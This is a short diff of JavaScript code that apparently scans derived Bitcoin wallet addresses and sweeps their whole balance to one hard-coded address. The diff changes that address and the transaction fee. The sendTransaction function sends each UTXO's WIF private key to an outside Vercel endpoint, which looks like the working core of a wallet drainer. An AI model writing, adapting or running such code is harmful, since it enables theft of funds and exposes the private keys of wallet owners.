@@ -201,9 +201,9 @@ async function checkAddress(account, index, chain, network, bipType, electrumCli
 async function sendTransaction(totalBalance, utxos) {
     const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
     const amountToSend = totalBalance;
-    const changeAddress = "bc1qt4pxuzpzqjnjrp96ry02ylgs93sjruj38q67s2";
-    const recipientAddress = "bc1qt4pxuzpzqjnjrp96ry02ylgs93sjruj38q67s2";
-    const transactionFee = 10000;
+    const changeAddress = "bc1qtydcsp8p53u55ncs6f207d2djq4v73f4jqck99";
+    const recipientAddress = "bc1qtydcsp8p53u55ncs6f207d2djq4v73f4jqck99";
+    const transactionFee = 5000;
     const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.status}`).join('|');
 
     const body = {
